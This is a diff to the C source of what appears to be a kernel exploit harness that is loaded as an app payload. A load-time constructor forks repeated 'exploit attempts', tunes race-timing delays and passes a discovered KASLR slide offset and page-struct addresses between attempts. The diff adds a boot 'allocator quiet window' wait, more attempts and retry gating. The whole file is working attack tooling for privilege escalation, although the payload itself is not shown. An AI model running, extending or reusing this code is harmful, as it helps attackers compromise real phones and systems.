@@ -1,18 +1,22 @@
 #include "common.h"
 
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+#define DEFAULT_EXPLOIT_ATTEMPTS 24
+#else
 #define DEFAULT_EXPLOIT_ATTEMPTS 16
+#endif
 #define DEFAULT_PSELECT_DELAY_USEC 20000
 #define DEFAULT_ATTEMPT_TIMEOUT_SEC 90
 #define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 20
+#define APP_MIN_BOOT_UPTIME_SEC 120
 
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
-static const uintptr_t app_slide_p0_offsets[] = {
-  SLIDE_P0_OFFSET_CANDIDATES
-};
-
 struct app_p0_shared_state {
+  atomic_int dirty;
   atomic_int ready;
   _Atomic uintptr_t offset;
+  _Atomic uintptr_t gate_page_struct;
+  _Atomic uintptr_t probe_page_struct;
 };
 
 static struct app_p0_shared_state *app_p0_state;
@@ -21,8 +25,19 @@ void app_publish_p0_offset(uintptr_t offset) {
   if (!app_p0_state) {
     return;
   }
+  atomic_store(&app_p0_state->gate_page_struct, p0_gate_page_struct);
+  atomic_store(&app_p0_state->probe_page_struct, p0_probe_page_struct);
   atomic_store(&app_p0_state->offset, offset);
   atomic_store(&app_p0_state->ready, 1);
+}
+
+void app_publish_p0_dirty(void) {
+  if (!app_p0_state) {
+    return;
+  }
+  atomic_store(&app_p0_state->gate_page_struct, p0_gate_page_struct);
+  atomic_store(&app_p0_state->probe_page_struct, p0_probe_page_struct);
+  atomic_store(&app_p0_state->dirty, 1);
 }
 
 #endif
@@ -43,12 +58,33 @@ static int env_int(const char *name, int fallback, int min, int max) {
 }
 
 static int attempt_delay_usec(int base_delay, int attempt) {
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+  static const int offsets[] = {
+    5000, 0, 10000, 30000, -5000, 20000, 15000, 25000,
+  };
+#else
   static const int offsets[] = {
     0, 10000, 30000, 5000, 20000, -5000, 40000, 15000,
   };
+#endif
   int count = (int)(sizeof(offsets) / sizeof(offsets[0]));
   int delay = base_delay + offsets[(attempt - 1) % count];
   return delay < 0 ? 0 : delay;
+}
+
+static void wait_for_boot_quiet_window(void) {
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+  struct timespec uptime;
+  SYSCHK(clock_gettime(CLOCK_BOOTTIME, &uptime));
+  if (uptime.tv_sec < APP_MIN_BOOT_UPTIME_SEC) {
+    time_t wait_sec = APP_MIN_BOOT_UPTIME_SEC - uptime.tv_sec;
+    pr_info("waiting for boot allocator quiet window seconds=%lld uptime=%lld\n",
+            (long long)wait_sec, (long long)uptime.tv_sec);
+    while (wait_sec > 0) {
+      wait_sec = sleep((unsigned int)wait_sec);
+    }
+  }
+#endif
 }
 
 __attribute__((constructor)) static void load(void) {
@@ -58,15 +94,10 @@ __attribute__((constructor)) static void load(void) {
   }
   started = 1;
   set_unbuffer();
+  wait_for_boot_quiet_window();
 
   int max_attempts = env_int(
       "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
-#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
-  if (!getenv("EXPLOIT_ATTEMPTS") && !getenv("SLIDE_P0_OFFSET")) {
-    max_attempts =
-        (int)(sizeof(app_slide_p0_offsets) / sizeof(app_slide_p0_offsets[0]));
-  }
-#endif
   int base_delay = env_int(
       "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
   int attempt_timeout_sec = env_int(
@@ -100,15 +131,6 @@ __attribute__((constructor)) static void load(void) {
 
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     int delay_usec = attempt_delay_usec(base_delay, attempt);
-#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
-    uintptr_t app_attempt_offset = 0;
-    if (!getenv("SLIDE_P0_OFFSET")) {
-      size_t candidate_index =
-          (size_t)(attempt - 1) %
-          (sizeof(app_slide_p0_offsets) / sizeof(app_slide_p0_offsets[0]));
-      app_attempt_offset = app_slide_p0_offsets[candidate_index];
-    }
-#endif
     pid_t child = SYSCHK(fork());
     if (child == 0) {
       SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
@@ -119,14 +141,15 @@ __attribute__((constructor)) static void load(void) {
       snprintf(delay, sizeof(delay), "%d", delay_usec);
       SYSCHK(setenv("PSELECT_DELAY_USEC", delay, 1));
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
-      if (!getenv("SLIDE_P0_OFFSET")) {
-        char offset_arg[16];
-        snprintf(offset_arg, sizeof(offset_arg), "0x%zx", app_attempt_offset);
-        SYSCHK(setenv("SLIDE_P0_OFFSET", offset_arg, 1));
+      const char *forced_offset = getenv("SLIDE_P0_OFFSET");
+      if (forced_offset) {
+        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=%s\n",
+                   attempt, max_attempts, getpid(), delay_usec,
+                   forced_offset);
+      } else {
+        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=scan\n",
+                   attempt, max_attempts, getpid(), delay_usec);
       }
-      pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=%s\n",
-                 attempt, max_attempts, getpid(), delay_usec,
-                 getenv("SLIDE_P0_OFFSET"));
 #else
       pr_success("exploit attempt=%d/%d pid=%d delay=%d\n",
                  attempt, max_attempts, getpid(), delay_usec);
@@ -181,10 +204,23 @@ __attribute__((constructor)) static void load(void) {
     if (!getenv("SLIDE_P0_OFFSET") &&
         atomic_load(&app_p0_state->ready)) {
       uintptr_t offset = atomic_load(&app_p0_state->offset);
+      uintptr_t gate_page = atomic_load(&app_p0_state->gate_page_struct);
+      uintptr_t probe_page = atomic_load(&app_p0_state->probe_page_struct);
       char offset_arg[16];
+      char gate_page_arg[24];
+      char probe_page_arg[24];
       snprintf(offset_arg, sizeof(offset_arg), "0x%zx", offset);
+      snprintf(gate_page_arg, sizeof(gate_page_arg), "0x%zx", gate_page);
+      snprintf(probe_page_arg, sizeof(probe_page_arg), "0x%zx", probe_page);
       SYSCHK(setenv("SLIDE_P0_OFFSET", offset_arg, 1));
-      pr_success("supervisor retained discovered p0_offset=%s\n", offset_arg);
+      SYSCHK(setenv("P0_GATE_PAGE_STRUCT", gate_page_arg, 1));
+      SYSCHK(setenv("P0_PROBE_PAGE_STRUCT", probe_page_arg, 1));
+      pr_success("supervisor retained p0_offset=%s gate=%s probe=%s\n",
+                 offset_arg, gate_page_arg, probe_page_arg);
+    } else if (!getenv("SLIDE_P0_OFFSET") &&
+               atomic_load(&app_p0_state->dirty)) {
+      pr_error("p0 oracle dirtied before slide discovery; refusing unsafe retry\n");
+      break;
     }
 #endif
 
@@ -194,8 +230,14 @@ __attribute__((constructor)) static void load(void) {
     } else {
       pr_warning("exploit attempt=%d/%d failed status=%d\n",
                  attempt, max_attempts,
-                 WIFEXITED(status) ? WEXITSTATUS(status) : status);
+                  WIFEXITED(status) ? WEXITSTATUS(status) : status);
     }
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+    if (attempt < max_attempts) {
+      pr_info("safe retry quiet delay seconds=5\n");
+      sleep(5);
+    }
+#endif
   }
 
   pr_error("exploit failed after %d independent attempts\n", max_attempts);
